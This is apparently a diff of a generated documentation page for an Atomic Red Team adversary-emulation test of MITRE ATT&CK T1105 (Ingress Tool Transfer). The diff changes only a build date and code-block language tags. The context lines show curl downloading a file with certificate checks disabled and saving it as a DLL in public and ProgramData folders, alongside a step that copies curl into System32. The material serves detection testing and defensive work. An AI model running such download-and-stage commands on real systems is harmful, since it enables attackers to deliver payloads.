@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1105"
 attack_technique_name: "Ingress Tool Transfer"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "2b080b99-0deb-4d51-af0f-833d37c4ca6a"
@@ -58,13 +58,13 @@ Curl must be installed on system.
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path #{curl_path}) {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile "PathToAtomicsFolder\..\ExternalPayloads\curl.zip"
 Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\curl.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\curl"
 Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\curl\curl-7.79.1-win64-mingw\bin\curl.exe" C:\Windows\System32\Curl.exe
@@ -78,7 +78,7 @@ Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl.zip"
 
 ### Command
 
-```commandprompt
+```cmd
 #{curl_path} -k #{file_download} -o c:\users\public\music\allthethingsx64.dll
 #{curl_path} -k #{file_download} --output c:\users\public\music\allthethingsx64.dll
 #{curl_path} -k #{file_download} -o c:\programdata\allthethingsx64.dll
@@ -87,7 +87,7 @@ Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl.zip"
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del c:\users\public\music\allthethingsx64.dll >nul 2>&1
 del c:\users\public\music\allthethingsx64.dll >nul 2>&1
 del c:\programdata\allthethingsx64.dll >nul 2>&1
